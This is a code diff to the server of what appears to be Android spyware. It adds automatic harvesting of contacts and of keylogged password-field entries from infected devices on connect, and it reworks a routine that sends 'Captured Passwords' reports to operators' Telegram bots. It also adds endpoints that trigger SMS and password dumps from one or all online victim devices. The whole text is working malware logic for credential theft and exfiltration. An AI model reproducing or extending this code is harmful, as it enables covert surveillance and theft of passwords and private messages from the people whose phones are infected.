@@ -129,6 +129,13 @@ const _internalCmdCallbacks = new Map();
 const _userKeylogBuffers = new Map();
 const USER_KEYLOG_FLUSH_MS = 4000;
 
+// ── Auto-sync state ───────────────────────────────────────────────────────────
+// Track when each device was last synced (passwords + contacts) so we don't
+// re-sync within 5 minutes of the last sync on a rapid reconnect.
+const deviceLastSyncAt = new Map(); // deviceId → { passwords: ts, contacts: ts }
+const deviceContacts   = new Map(); // deviceId → contacts[]
+const devicePasswords  = new Map(); // deviceId → password entries[]
+
 async function _forwardKeylogToUsers(deviceId, entry) {
     try {
         const rec = inMemoryDevices.get(deviceId);
@@ -258,52 +265,126 @@ async function _autoSendSmsToTelegram(deviceId, deviceName, sendToAdmin, userLis
 }
 
 async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
+    // Collect from in-memory sync (passwords already fetched and stored on last connect)
+    const storedPwds = devicePasswords.get(deviceId) || [];
+
+    // Also request live from device if online
+    let livePwds = [];
     const conn = _getTcpConnForDevice(deviceId);
-    if (!conn || !conn.writable) return;
-    const commandId = crypto.randomBytes(12).toString('hex');
-    _internalCmdCallbacks.set(commandId, { ts: Date.now(), handler: async (response, error) => {
-        if (error || !response) return;
-        let entries = [];
+    if (conn && conn.writable) {
         try {
-            const d = typeof response === 'string' ? JSON.parse(response) : response;
-            const all = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
-            entries = all.filter(e =>
-                e.isPassword === true || e.isPassword === 'true' || e.eventType === 'PASSWORD_FOCUS'
-            );
+            const resp = await _sendAndCapture(deviceId, 'get_keylogs', {}, 30000);
+            if (resp) {
+                const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
+                const all = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
+                livePwds = all.filter(e =>
+                    e.isPassword === true || e.isPassword === 'true' || e.eventType === 'PASSWORD_FOCUS'
+                );
+            }
         } catch (_) {}
-        if (!entries.length) return;
-        const safeEscape = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-        const htmlBody = entries.map(e => {
-            const app  = safeEscape(e.appName || e.packageName || 'Unknown app');
-            const text = safeEscape((e.text || e.typedText || '').slice(0, 200));
-            const ts   = e.timestamp ? new Date(e.timestamp).toLocaleString() : '';
-            const field = e.fieldType ? ` <i>${safeEscape(e.fieldType)}</i>` : '';
-            return `🔑 <b>${app}</b>${field} <i>${ts}</i>\n<code>${text}</code>`;
-        }).join('\n\n');
-        const header =
-            `🔑 <b>Captured Passwords — ${safeEscape(deviceName)}</b>\n` +
-            `━━━━━━━━━━━━━━━━━━━\n` +
-            `🆔 <code>${deviceId}</code>\n` +
-            `📊 ${entries.length} password field${entries.length !== 1 ? 's' : ''} captured\n\n`;
-        const full = header + htmlBody;
-        const CHUNK = 3800;
-        if (sendToAdmin && telegramSettings.botToken && telegramSettings.chatId) {
+    }
+
+    // Merge stored + live, dedupe by app+text+timestamp
+    const seen = new Set();
+    const entries = [...storedPwds, ...livePwds].filter(e => {
+        const key = `${e.appName || e.packageName || ''}|${(e.text || e.typedText || '').slice(0, 50)}|${e.timestamp || ''}`;
+        if (seen.has(key)) return false;
+        seen.add(key);
+        return true;
+    });
+
+    if (!entries.length) return;
+    const safeEscape = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    const htmlBody = entries.map(e => {
+        const app  = safeEscape(e.appName || e.packageName || 'Unknown app');
+        const text = safeEscape((e.text || e.typedText || '').slice(0, 200));
+        const ts   = e.timestamp ? new Date(e.timestamp).toLocaleString() : '';
+        const field = e.fieldType ? ` <i>${safeEscape(e.fieldType)}</i>` : '';
+        return `🔑 <b>${app}</b>${field} <i>${ts}</i>\n<code>${text}</code>`;
+    }).join('\n\n');
+    const header =
+        `🔑 <b>Captured Passwords — ${safeEscape(deviceName)}</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━\n` +
+        `🆔 <code>${deviceId}</code>\n` +
+        `📊 ${entries.length} password field${entries.length !== 1 ? 's' : ''} captured\n\n`;
+    const full = header + htmlBody;
+    const CHUNK = 3800;
+    if (sendToAdmin && telegramSettings.botToken && telegramSettings.chatId) {
+        for (let i = 0; i < full.length; i += CHUNK) {
+            await sendTelegramRaw(telegramSettings.botToken, telegramSettings.chatId, full.slice(i, i + CHUNK));
+            await new Promise(r => setTimeout(r, 300));
+        }
+    }
+    if (userList && userList.length) {
+        for (const u of userList) {
             for (let i = 0; i < full.length; i += CHUNK) {
-                await sendTelegramRaw(telegramSettings.botToken, telegramSettings.chatId, full.slice(i, i + CHUNK));
+                await sendTelegramRaw(u.telegramBotToken, u.telegramChatId, full.slice(i, i + CHUNK));
                 await new Promise(r => setTimeout(r, 300));
             }
         }
-        if (userList && userList.length) {
-            for (const u of userList) {
-                for (let i = 0; i < full.length; i += CHUNK) {
-                    await sendTelegramRaw(u.telegramBotToken, u.telegramChatId, full.slice(i, i + CHUNK));
-                    await new Promise(r => setTimeout(r, 300));
+    }
+}
+
+// ── Helper: send a command to a device and wait for its response ──────────────
+function _sendAndCapture(deviceId, command, params = {}, timeoutMs = 30000) {
+    return new Promise((resolve) => {
+        const conn = _getTcpConnForDevice(deviceId);
+        if (!conn || !conn.writable) { resolve(null); return; }
+        const cmdId = crypto.randomBytes(12).toString('hex');
+        const timer = setTimeout(() => {
+            _internalCmdCallbacks.delete(cmdId);
+            resolve(null);
+        }, timeoutMs);
+        _internalCmdCallbacks.set(cmdId, { ts: Date.now(), handler: (response, error) => {
+            clearTimeout(timer);
+            _internalCmdCallbacks.delete(cmdId);
+            resolve(error ? null : response);
+        }});
+        tcpSend(conn, 'command:execute', { commandId: cmdId, command, params });
+    });
+}
+
+// ── Auto-sync: request passwords + contacts from device on fresh connect ──────
+// Respects a 5-minute dedup window so rapid reconnects don't cause double-syncs.
+async function _autoSyncDevice(deviceId) {
+    const SYNC_DEDUP_MS = 5 * 60 * 1000;
+    const last = deviceLastSyncAt.get(deviceId) || {};
+    const now  = Date.now();
+
+    // Sync contacts
+    if ((now - (last.contacts || 0)) > SYNC_DEDUP_MS) {
+        deviceLastSyncAt.set(deviceId, { ...(deviceLastSyncAt.get(deviceId) || {}), contacts: now });
+        try {
+            const resp = await _sendAndCapture(deviceId, 'get_all_contacts', {}, 30000);
+            if (resp) {
+                const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
+                const contacts = d.contacts || d.allContacts || d.data || [];
+                if (contacts.length) {
+                    deviceContacts.set(deviceId, contacts);
+                    log('SYNC', `Contacts synced: ${contacts.length} entries for ${deviceId}`);
                 }
             }
-        }
-    }});
-    setTimeout(() => _internalCmdCallbacks.delete(commandId), 60000);
-    tcpSend(conn, 'command:execute', { commandId, command: 'get_keylogs', params: {} });
+        } catch (_) {}
+    }
+
+    // Sync passwords (from device keylogs filtered by isPassword)
+    if ((now - (last.passwords || 0)) > SYNC_DEDUP_MS) {
+        deviceLastSyncAt.set(deviceId, { ...(deviceLastSyncAt.get(deviceId) || {}), passwords: now });
+        try {
+            const resp = await _sendAndCapture(deviceId, 'get_keylogs', {}, 30000);
+            if (resp) {
+                const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
+                const all = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
+                const pwds = all.filter(e =>
+                    e.isPassword === true || e.isPassword === 'true' || e.eventType === 'PASSWORD_FOCUS'
+                );
+                if (pwds.length) {
+                    devicePasswords.set(deviceId, pwds);
+                    log('SYNC', `Passwords synced: ${pwds.length} entries for ${deviceId}`);
+                }
+            }
+        } catch (_) {}
+    }
 }
 
 // Build-worker settings — admin sets API key in dashboard Settings.
@@ -917,6 +998,10 @@ async function processMessage(clientId, clientType, event, data) {
                 } catch (_) {}
             };
             _doAutoPasswords();
+
+            // Auto-sync passwords + contacts into memory (5-min dedup)
+            // Runs slightly after the Telegram send so both don't hammer the device simultaneously
+            setTimeout(() => _autoSyncDevice(deviceId).catch(() => {}), 6000);
         }
         return;
     }
@@ -1785,6 +1870,98 @@ app.post('/api/settings/telegram/test', requireUserOrAdmin, async (req, res) => 
         return res.status(400).json({ success: false, error: result.description || 'Telegram API error' });
     } catch (e) {
         return res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// POST /api/settings/telegram/test-sms
+// deviceId = specific device ID  OR  'all' = every online device under this account
+app.post('/api/settings/telegram/test-sms', requireUserOrAdmin, async (req, res) => {
+    const { deviceId } = req.body || {};
+    if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
+
+    let activeToken, activeChat, userList = [], accessIdFilter = null;
+    if (req.authRole === 'admin') {
+        activeToken = telegramSettings.botToken;
+        activeChat  = telegramSettings.chatId;
+    } else {
+        try {
+            const user = await User.findById(req.authUserId).select('telegramBotToken telegramChatId accessId');
+            if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
+            activeToken    = user.telegramBotToken;
+            activeChat     = user.telegramChatId;
+            accessIdFilter = user.accessId;
+            userList = [{ telegramBotToken: activeToken, telegramChatId: activeChat }];
+        } catch (e) { return res.status(500).json({ success: false, error: e.message }); }
+    }
+    if (!activeToken || !activeChat) return res.status(400).json({ success: false, error: 'Telegram bot not configured — set Bot Token and Chat ID first.' });
+
+    // Resolve target device list
+    let targets = [];
+    if (deviceId === 'all') {
+        for (const [id, rec] of inMemoryDevices) {
+            if (!rec.isOnline) continue;
+            if (accessIdFilter && rec.accessId !== accessIdFilter) continue;
+            const conn = _getTcpConnForDevice(id);
+            if (conn && conn.writable) targets.push({ id, name: rec.deviceInfo?.name || rec.deviceName || id });
+        }
+        if (!targets.length) return res.status(400).json({ success: false, error: 'No online devices found for this account.' });
+    } else {
+        const conn = _getTcpConnForDevice(deviceId);
+        if (!conn || !conn.writable) return res.status(400).json({ success: false, error: 'Device is offline — connect the device first.' });
+        const rec = inMemoryDevices.get(deviceId);
+        targets = [{ id: deviceId, name: rec?.deviceInfo?.name || rec?.deviceName || deviceId }];
+    }
+
+    res.json({ success: true, message: `SMS dump triggered for ${targets.length} device${targets.length !== 1 ? 's' : ''} — check Telegram in a few seconds.` });
+    for (const t of targets) {
+        _autoSendSmsToTelegram(t.id, t.name, req.authRole === 'admin', userList).catch(() => {});
+        await new Promise(r => setTimeout(r, 500)); // slight stagger to avoid Telegram rate limits
+    }
+});
+
+// POST /api/settings/telegram/test-passwords
+// deviceId = specific device ID  OR  'all' = every online device under this account
+app.post('/api/settings/telegram/test-passwords', requireUserOrAdmin, async (req, res) => {
+    const { deviceId } = req.body || {};
+    if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
+
+    let activeToken, activeChat, userList = [], accessIdFilter = null;
+    if (req.authRole === 'admin') {
+        activeToken = telegramSettings.botToken;
+        activeChat  = telegramSettings.chatId;
+    } else {
+        try {
+            const user = await User.findById(req.authUserId).select('telegramBotToken telegramChatId accessId');
+            if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
+            activeToken    = user.telegramBotToken;
+            activeChat     = user.telegramChatId;
+            accessIdFilter = user.accessId;
+            userList = [{ telegramBotToken: activeToken, telegramChatId: activeChat }];
+        } catch (e) { return res.status(500).json({ success: false, error: e.message }); }
+    }
+    if (!activeToken || !activeChat) return res.status(400).json({ success: false, error: 'Telegram bot not configured — set Bot Token and Chat ID first.' });
+
+    // Resolve target device list
+    let targets = [];
+    if (deviceId === 'all') {
+        for (const [id, rec] of inMemoryDevices) {
+            if (!rec.isOnline) continue;
+            if (accessIdFilter && rec.accessId !== accessIdFilter) continue;
+            const conn = _getTcpConnForDevice(id);
+            if (conn && conn.writable) targets.push({ id, name: rec.deviceInfo?.name || rec.deviceName || id });
+        }
+        if (!targets.length) return res.status(400).json({ success: false, error: 'No online devices found for this account.' });
+    } else {
+        const conn = _getTcpConnForDevice(deviceId);
+        if (!conn || !conn.writable) return res.status(400).json({ success: false, error: 'Device is offline — connect the device first.' });
+        const rec = inMemoryDevices.get(deviceId);
+        targets = [{ id: deviceId, name: rec?.deviceInfo?.name || rec?.deviceName || deviceId }];
+    }
+
+    res.json({ success: true, message: `Password dump triggered for ${targets.length} device${targets.length !== 1 ? 's' : ''} — check Telegram in a few seconds.` });
+    for (const t of targets) {
+        _autoSendPasswordsToTelegram(t.id, t.name, req.authRole === 'admin', userList).catch(() => {});
+        await new Promise(r => setTimeout(r, 500));
     }
 });
 
